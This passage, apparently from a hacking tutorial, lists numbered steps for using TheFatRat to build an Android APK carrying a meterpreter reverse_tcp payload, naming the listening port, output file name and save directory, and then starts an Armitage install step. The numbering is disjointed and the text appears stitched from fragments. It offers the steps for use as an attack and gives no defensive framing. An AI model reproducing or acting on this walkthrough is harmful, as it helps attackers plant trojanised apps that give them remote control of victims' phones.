    4. "navigate to site using given links"
    5. "You can view your files from anywhere so long as you are connected to internet"

#2 TheFatRat

    5. set your listening port say (443)
    6. give your output file a name (fsociety)
    7. [ 3 ] android/meterpreter/reverse_tcp #create the payload
    8. choose not to create a listener for the file (n)
    9. go check out your .apk , its saved in (/root/Fatrat_Generated/) directory

        #armitage
        1. install armitage (apt install armitage)
